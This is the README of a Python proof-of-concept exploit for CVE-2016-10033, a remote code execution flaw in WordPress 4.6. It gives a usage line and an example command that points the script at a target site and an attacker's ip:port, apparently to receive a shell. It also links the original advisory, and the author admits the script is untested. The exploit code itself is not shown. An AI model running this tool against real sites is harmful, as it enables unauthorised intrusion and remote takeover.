# PoC for CVE-2016-10033

**RCE against WordPress 4.6**

usage:
```
./CVE-2016-10033.py <target site> <your ip:port> <username>
```
example: 
```
./CVE-2016-10033.py http://site.com/ 1.2.3.4:4444 admin
```

---

Python port (+alterations) of https://exploitbox.io/vuln/WordPress-Exploit-4-6-RCE-CODE-EXEC-CVE-2016-10033.html 

Required: Requests (pip install requests)

---

I haven't had the chance to test this so please let me know about your results